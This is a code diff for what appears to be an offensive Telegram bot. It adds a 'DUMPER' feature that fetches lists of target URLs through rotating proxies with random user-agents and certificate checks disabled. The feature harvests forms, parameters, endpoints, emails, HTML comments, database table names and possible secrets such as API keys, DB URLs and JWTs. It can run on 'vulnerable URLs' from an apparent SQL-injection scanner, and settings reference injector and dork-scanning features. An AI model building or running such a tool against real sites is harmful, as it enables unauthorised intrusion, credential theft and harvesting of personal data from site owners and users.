+        L_.append("  " + ", ".join(rec["params"]))
+    if rec["endpoints"]:
+        L_.append("-" * 62)
+        L_.append("ENDPOINTS (%d)" % len(rec["endpoints"]))
+        L_ += ["  " + e for e in rec["endpoints"]]
+    if rec["js"]:
+        L_.append("-" * 62)
+        L_.append("JS FILES (%d)" % len(rec["js"]))
+        L_ += ["  " + j for j in rec["js"]]
+    if rec["emails"]:
+        L_.append("-" * 62)
+        L_.append("EMAILS (%d)" % len(rec["emails"]))
+        L_ += ["  " + e for e in rec["emails"]]
+    if rec["comments"]:
+        L_.append("-" * 62)
+        L_.append("HTML COMMENTS (%d)" % len(rec["comments"]))
+        L_ += ["  " + c for c in rec["comments"]]
+    if rec["tables"]:
+        L_.append("-" * 62)
+        L_.append("TABLE / COLUMN NAMES (%d)" % len(rec["tables"]))
+        L_ += ["  " + t for t in rec["tables"]]
+    if rec["secrets"]:
+        L_.append("-" * 62)
+        L_.append("POSSIBLE SECRETS (%d)" % len(rec["secrets"]))
+        L_ += ["  %s: %s" % (n, v) for n, v in rec["secrets"]]
+    L_.append("=" * 62)
+    return L_
+
+
+async def dump_harvest(urls: list, progress=None, uid=None, timeout: float = 10.0,
+                       conc: int = 12) -> dict:
+    """Har URL fetch karo aur data nikaalo — asli network, rot proxy priority."""
+    urls = _uniq([u for u in (urls or []) if str(u).startswith("http")])
+    st = {"urls": len(urls), "done": 0, "records": [], "errors": 0,
+          "start": time.time(), "stopped": 0}
+    rot = ProxyRotator(enabled=proxy_available())
+    sem = asyncio.Semaphore(max(2, min(40, conc)))
+    lock = asyncio.Lock()
+    conn = mk_connector(limit=max(6, conc), force_close=True)
+    hdrs = {"User-Agent": random.choice(UA_LIST), "Accept": "*/*"}
+
+    async def one(session, u):
+        if uid and stop_requested(uid):
+            return
+        async with sem:
+            if uid and stop_requested(uid):
+                return
+            kw = {"headers": dict(hdrs), "timeout": aiohttp.ClientTimeout(total=timeout),
+                  "ssl": False, "allow_redirects": True, "max_redirects": 5}
+            px = rot.next()
+            if px:
+                pxc, _h2, _i2, _s2 = await proxy_connect_url(px)
+                kw["proxy"] = pxc
+            try:
+                async with session.get(u, **kw) as r:
+                    body = await r.text(errors="ignore")
+                    rec = dump_extract(str(r.url), r.status, dict(r.headers), body)
+                    rec["input"] = u
+            except Exception as exc:
+                rec = {"input": u, "url": u, "error": str(exc)[:80]}
+            async with lock:
+                st["done"] += 1
+                if rec.get("error"):
+                    st["errors"] += 1
+                else:
+                    st["records"].append(rec)
+
+    async with aiohttp.ClientSession(connector=conn) as session:
+        await asyncio.gather(*[one(session, u) for u in urls])
+        if uid and stop_requested(uid):
+            st["stopped"] = 1
+        if progress:
+            try:
+                await progress(st)
+            except Exception:
+                pass
+    # per-URL txt + zip
+    stamp_ = stamp()
+    made, zpath = [], os.path.join(DUMP_DIR, "dump_pack_%s.zip" % stamp_)
+    summary_csv = os.path.join(DUMP_DIR, "dump_summary_%s.csv" % stamp_)
+    try:
+        with zipfile.ZipFile(zpath, "w", zipfile.ZIP_DEFLATED) as zf:
+            for i, rec in enumerate(st["records"], 1):
+                txt = dump_record_text(rec)
+                host = re.sub(r"[^A-Za-z0-9.\-]", "_", urlparse(rec["url"]).netloc or "site")
+                name = "%02d_%s.txt" % (i, host[:40])
+                fp = os.path.join(DUMP_DIR, "dump_" + stamp_ + "_" + name)
+                with open(fp, "w", encoding="utf-8") as f:
+                    f.write("\n".join(txt) + "\n")
+                zf.write(fp, arcname=name)
+                made.append(fp)
+            with open(summary_csv, "w", encoding="utf-8") as f:
+                f.write("url,status,server,title,forms,params,endpoints,js,emails,"
+                        "comments,tables,secrets,bytes\n")
+                for rec in st["records"]:
+                    f.write('"%s",%s,"%s","%s",%d,%d,%d,%d,%d,%d,%d,%d,%d\n' % (
+                        rec["url"].replace('"', "%22"), rec["status"],
+                        str(rec["server"]).replace('"', "'")[:40],
+                        str(rec["title"]).replace('"', "'")[:70], len(rec["forms"]),
+                        len(rec["params"]), len(rec["endpoints"]), len(rec["js"]),
+                        len(rec["emails"]), len(rec["comments"]), len(rec["tables"]),
+                        len(rec["secrets"]), rec["bytes"]))
+            zf.write(summary_csv, arcname="summary.csv")
+            js = dump_json({"count": len(st["records"]),
+                            "records": [dict({k: r.get(k) for k in
+                                      ("url", "status", "server", "title", "bytes")},
+                                     params=r.get("params", [])[:50],
+                                     endpoints=r.get("endpoints", [])[:60],
+                                     emails=r.get("emails", [])[:30])
+                                for r in st["records"]]},
+                           "dump_json_" + stamp_)
+            zf.write(js, arcname="summary.json")
+    except Exception as exc:
+        logger.warning("dump pack zip fail: %s", exc)
+    st["files"] = made
+    st["zip"] = zpath if os.path.exists(zpath) else ""
+    st["csv"] = summary_csv if os.path.exists(summary_csv) else ""
+    st["took"] = time.time() - st["start"]
+    return st
+
+
 async def tool_dump(update, context):
+    """DUMPER — URLs do, poora page data harvest karke files/zip milti hain."""
+    q = update.callback_query
+    files = dumps_list(5)
+    last = len(context.user_data.get("last_urls") or [])
+    vuln_last = len(context.user_data.get("last_vulns") or [])
+    rows = [[InlineKeyboardButton("📥 SEND URLS / FILE — start dump",
+                                  callback_data="df:go")]]
+    if vuln_last:
+        rows.append([InlineKeyboardButton("💉 USE LAST %d VULNERABLE URLS" % vuln_last,
+                                          callback_data="df:vuln")])
+    if last:
+        rows.append([InlineKeyboardButton("📥 USE LAST %d PARSER URLS" % last,
+                                          callback_data="df:last")])
+    if files:
+        rows.append([InlineKeyboardButton("📄 Old dump files (%d)" % len(files),
+                                          callback_data="df:old")])
+        rows.append([InlineKeyboardButton("📦 ALL ZIP", callback_data="df:zip")])
+    rows.append([InlineKeyboardButton("📤 FULL EXPORT (kw/dork/urls)",
+                                      callback_data="df:full")])
+    rows.append([InlineKeyboardButton("⬅️ BACK", callback_data="m:home")])
+    txt = (H("DUMPER", "page data harvester") + "\n\n"
+           + B("What you get") + "\n"
+           + KV("Forms", "action · method · id", "🧾") + "\n"
+           + KV("Parameters", "har link/input ka param", "🔧") + "\n"
+           + KV("Endpoints", "page ke saare andar ke links", "🔗") + "\n"
+           + KV("JS files", "script src list", "📜") + "\n"
+           + KV("Emails", "page pe mile emails", "✉️") + "\n"
+           + KV("Comments", "HTML comments (leaks)", "💬") + "\n"
+           + KV("Tables", "query me dikhe table/column names", "🗃") + "\n"
+           + KV("Secrets", "API keys / DB URLs / JWT", "🔑") + "\n\n"
+           + P("Send URLs one per line, or a .txt / .csv file — one report per URL, "
+               "and the whole pack as a single zip.") + "\n\n"
+           + "<code>https://target.com/page.php?id=5</code>")
+    try:
+        await q.edit_message_text(txt, reply_markup=RK(rows), parse_mode=ParseMode.HTML)
+    except Exception:
+        pass
+
+
+async def cb_dump_go(update, context):
+    q = update.callback_query
+    rows = [[InlineKeyboardButton("⬅️ BACK", callback_data="m:dump")]]
+    txt = (H("SEND URLS TO DUMP", "text ya file") + "\n\n"
+           + B("Paste") + "\n" + P("one URL per line") + "\n"
+           + "<code>https://target.com/item.php?id=12</code>\n\n"
+           + B("File") + "\n" + P(".txt / .csv / .json / .xlsx — all URLs at once")
+           + "\n\n"
+           + KV("Timeout", "<code>%ss</code>" % int(sget("dump_timeout", 10) or 10), "⏱")
+           + "\n" + KV("Parallel", "<code>%d</code> pages" % int(sget("dump_conc", 12) or 12), "⚡")
+           + "\n\n" + P("You get one report per URL, plus everything in one zip."))
+    try:
+        await q.edit_message_text(txt, reply_markup=RK(rows), parse_mode=ParseMode.HTML)
+    except Exception:
+        pass
+    await_set(context, "dump_urls")
+
+
+async def cb_dump_old(update, context):
     q = update.callback_query
     files = dumps_list(12)
     if not files:
         try:
-            await q.edit_message_text(H("DUMPER") + "\n\n📭 No files yet.",
-                                      reply_markup=kb_back(), parse_mode=ParseMode.HTML)
+            await q.answer("No files yet", show_alert=True)
         except Exception:
             pass
         return
-    rows = [[InlineKeyboardButton("📄 %s (%.0f KB)" % (os.path.basename(f)[:28],
-                                                       os.path.getsize(f) / 1024),
+    rows = [[InlineKeyboardButton("📄 %s (%.0f KB)" % (os.path.basename(f)[:26],
+                                                      os.path.getsize(f) / 1024),
                                   callback_data="df:%d" % i)]
             for i, f in enumerate(files)]
-    rows.append([InlineKeyboardButton("📤 FULL EXPORT (no caps)",
-                                      callback_data="df:full")])
-    rows.append([InlineKeyboardButton("📦 ALL ZIP", callback_data="df:zip")])
-    rows.append([InlineKeyboardButton("⬅️ BACK", callback_data="m:home")])
+    rows.append([InlineKeyboardButton("⬅️ BACK", callback_data="m:dump")])
     try:
-        await q.edit_message_text(H("DUMPER", "%d files" % len(files)) + "\n\nWhich file?",
+        await q.edit_message_text(H("OLD DUMP FILES", "%d saved" % len(files)),
                                   reply_markup=RK(rows), parse_mode=ParseMode.HTML)
     except Exception:
         pass
+
+
+async def cb_dump_use(update, context, which: str):
+    """df:last / df:vuln — purane URLs se seedha dump."""
+    if which == "vuln":
+        urls = _uniq([v.get("base") or v["url"]
+                      for v in (context.user_data.get("last_vulns") or [])])
+    else:
+        urls = context.user_data.get("last_urls") or []
+    if not urls:
+        try:
+            await update.callback_query.answer("Nothing saved yet — run a scan first",
+                                               show_alert=True)
+        except Exception:
+            pass
+        return
+    await _run_dump(update, context, urls)
+
+
+def _dump_progress_card(st: dict, spin: int) -> str:
+    pct = (st["done"] / max(1, st["urls"])) * 100
+    took = max(0.001, time.time() - st["start"])
+    rate = st["done"] / took
+    eta = ((st["urls"] - st["done"]) / rate) if rate > 0.05 else 0
+    return (H("DUMPING", "page harvest in progress") + "\n\n"
+            + bar3(pct, 12, spin) + "\n\n"
+            + "❖ Pages     : <code>%s/%s</code>\n" % (fmt(st["done"]), fmt(st["urls"]))
+            + "❖ Extracted : <code>%s</code>\n" % fmt(len(st["records"]))
+            + "❖ Errors    : <code>%s</code>\n" % fmt(st["errors"])
+            + "❖ Speed     : <code>%.1f page/s</code>\n" % rate
+            + "❖ ETA       : <code>%s</code>" % (("%.0fs" % eta) if eta else "—"))
+
+
+async def _run_dump(update, context, urls):
+    uid = str(update.effective_user.id)
+    stop_clear(uid)
+    tok = stop_mark(uid)
+    urls = _uniq([u for u in urls if str(u).startswith("http")])
+    msg = await reply_msg(update).reply_text(
+        _dump_progress_card({"urls": len(urls), "done": 0, "records": [], "errors": 0,
+                             "start": time.time()}, 0),
+        parse_mode=ParseMode.HTML, reply_markup=kb_stop(uid, tok))
+    spin = {"n": 0}
+
+    async def prog(st):
+        spin["n"] += 1
+        try:
+            await msg.edit_text(_dump_progress_card(st, spin["n"]),
+                                parse_mode=ParseMode.HTML, reply_markup=kb_stop(uid, tok))
+        except Exception:
+            pass
+
+    st = await dump_harvest(urls, progress=prog, uid=uid,
+                           timeout=float(sget("dump_timeout", 10) or 10),
+                           conc=int(sget("dump_conc", 12) or 12))
+    recs = st["records"]
+    tot_forms = sum(len(r["forms"]) for r in recs)
+    tot_ep = sum(len(r["endpoints"]) for r in recs)
+    tot_pr = len(_uniq([p for r in recs for p in r["params"]]))
+    tot_em = len(_uniq([e for r in recs for e in r["emails"]]))
+    tot_se = sum(len(r["secrets"]) for r in recs)
+    card = (H("DUMP COMPLETE", "%.1fs" % st.get("took", 0)) + "\n\n"
+            + bar3(100, 12, None) + "\n\n"
+            + "❖ Pages    : <code>%s</code> (errors <code>%s</code>)\n"
+            % (fmt(len(recs)), fmt(st["errors"]))
+            + "❖ Forms    : <code>%s</code>\n" % fmt(tot_forms)
+            + "❖ Endpoints: <code>%s</code>\n" % fmt(tot_ep)
+            + "❖ Params   : <code>%s</code>\n" % fmt(tot_pr)
+            + "❖ Emails   : <code>%s</code>\n" % fmt(tot_em)
+            + "❖ Secrets  : <code>%s</code>\n" % fmt(tot_se)
+            + ("⛔ Stopped early\n" if st.get("stopped") else "")
+            + "\n" + B("Top pages"))
+    for r in recs[:5]:
+        card += "\n<code>%s</code>\n<i>%s</i>" % (
+            esc(r["url"][:130]), esc(r["title"] or "no title")[:70])
+    if len(recs) > 5:
+        card += "\n<i>+ %d more inside the zip…</i>" % (len(recs) - 5)
+    try:
+        await msg.delete()
+    except Exception:
+        pass
+    for ch in chunk_lines(card)[:3]:
+        await reply_msg(update).reply_text(ch, parse_mode=ParseMode.HTML,
+                                           reply_markup=kb_back("m:dump"))
+    for f in st["files"][:4]:
+        await send_file(update, f, "📄 " + os.path.basename(f))
+    if len(st["files"]) > 4:
+        await reply_msg(update).reply_text(
+            "📁 Remaining %d report(s) are inside the zip below."
+            % (len(st["files"]) - 4), parse_mode=ParseMode.HTML)
+    if st.get("zip"):
+        await send_file(update, st["zip"], "📦 All reports + summary.csv + summary.json")
+    if st.get("csv"):
+        await send_file(update, st["csv"], "📊 One-line-per-page summary")
+    context.user_data["last_dump"] = {"pages": len(recs), "secrets": tot_se,
+                                     "zip": st.get("zip", "")}
+    await_clear(context)
+
+
+async def input_dump_urls(update, context, text: str):
+    urls = _urls_from_text(text)
+    if not urls:
+        await reply_msg(update).reply_text(
+            "❌ <b>No URLs found.</b>\nSend full URLs (one per line) or a .txt file:\n"
+            "<code>https://target.com/item.php?id=12</code>",
+            parse_mode=ParseMode.HTML, reply_markup=kb_back("m:dump"))
+        await_set(context, "dump_urls")
+        return
+    await _run_dump(update, context, urls)
 
 
 async def cb_dump_full(update, context):
@@ -7345,6 +8104,8 @@ async def cb_dump_file(update, context):
     q = update.callback_query
     arg = q.data.split(":", 1)[1]
     files = dumps_list(12)
+    if arg in ("go", "old", "last", "vuln"):
+        return await cb_dump_go(update, context)
     if arg == "full":
         return await cb_dump_full(update, context)
 
@@ -7647,7 +8408,7 @@ def kb_file(kind: str) -> InlineKeyboardMarkup:
 # file ko seedha in flows me daal sakte hain (text chahiye, number nahi)
 FILE_FLOW_TEXT = {"gen_kw", "dpgen_kw", "kw_input", "qa_keywords", "nc_kw", "px_paste",
                   "rot_paste",
-                  "qa_dorks", "qa_urls", "rev_urls", "inj_urls", "parse_dorks",
+                  "qa_dorks", "qa_urls", "rev_urls", "inj_urls", "dump_urls", "parse_dorks",
                   "rand_items", "pro_combo", "pro_domains", "pro_params",
                   "pro_filetypes", "pro_sfilters", "pro_pfilters"}
 # count wale steps — file se count nahi nikalte
@@ -8676,6 +9437,7 @@ AWAIT_HANDLERS = {
     "kw_count": input_kw_count,
     "rev_urls": input_rev_urls,
     "inj_urls": input_inj_urls,
+    "dump_urls": input_dump_urls,
     "parse_dorks": input_parse_dorks,
     "parse_max": input_parse_max,
     "rand_items": input_rand,
@@ -9755,6 +10517,11 @@ BATCH_KEYS = {
     "timeout": ("check_timeout", 3, 30, "Proxy check timeout (s)", 6, "⏱"),
     "limit":   ("parse_url_limit", 0, 200000, "URL limit (0 = ALL)", 0, "🌐"),
     "budget":  ("parse_budget", 60, 7200, "Scan time budget (min→sec)", 1800, "⏳"),
+    "injtargets": ("inj_targets", 6, 300, "Injector tests per URL", 36, "🔍"),
+    "injconc": ("inj_conc", 5, 200, "Injector parallel requests", 30, "⚡"),
+    "injtime": ("inj_timeout", 3, 30, "Injector request timeout (s)", 8, "⏱"),
+    "dumpconc": ("dump_conc", 2, 60, "Dumper parallel pages", 12, "📄"),
+    "dumptime": ("dump_timeout", 5, 45, "Dumper page timeout (s)", 10, "⌛"),
 }
 
 
@@ -9780,6 +10547,9 @@ def batch_card() -> str:
             "<code>/batch timeout 8</code>\n"
             "<code>/batch limit 0</code> — 0 = as many as found (ALL)\n"
             "<code>/batch budget 20</code> — scan runs for 20 minutes\n"
+            "<code>/batch injtargets 36</code> — injector tests per URL\n"
+            "<code>/batch injconc 30</code> · <code>/batch injtime 8</code>\n"
+            "<code>/batch dumpconc 12</code> · <code>/batch dumptime 10</code>\n"
             "<code>/batch trial 1</code> — trial lock ON (files locked)\n\n"
             "<i>Proxy batching checks 60k proxies in slices: 4k → next 4k → … "
             "until every one is done. 2000–4000 is best on a phone.</i>")
